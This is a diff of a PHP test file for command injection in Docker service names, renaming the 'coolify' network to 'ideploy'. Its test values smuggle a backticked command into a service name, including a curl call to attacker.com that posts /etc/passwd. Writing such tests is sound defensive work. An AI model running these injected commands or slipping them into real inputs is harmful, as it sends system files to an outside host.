@@ -118,7 +118,7 @@ test('service names used in docker network connect command', function () {
     // This demonstrates the actual vulnerability from StartService.php:41
     $maliciousServiceName = 'evil`curl attacker.com`';
     $uuid = 'test-uuid-123';
-    $network = 'coolify';
+    $network = 'ideploy';
 
     // Without validation, this would create a dangerous command
     $dangerousCommand = "docker network connect --alias {$maliciousServiceName}-{$uuid} $network {$maliciousServiceName}-{$uuid}";
@@ -134,7 +134,7 @@ test('service name from the vulnerability report example', function () {
     // The example could also target service names
     $maliciousCompose = <<<'YAML'
 services:
-  'coolify`curl https://attacker.com -X POST --data "$(cat /etc/passwd)"`':
+  'ideploy`curl https://attacker.com -X POST --data "$(cat /etc/passwd)"`':
     image: alpine
 YAML;
 
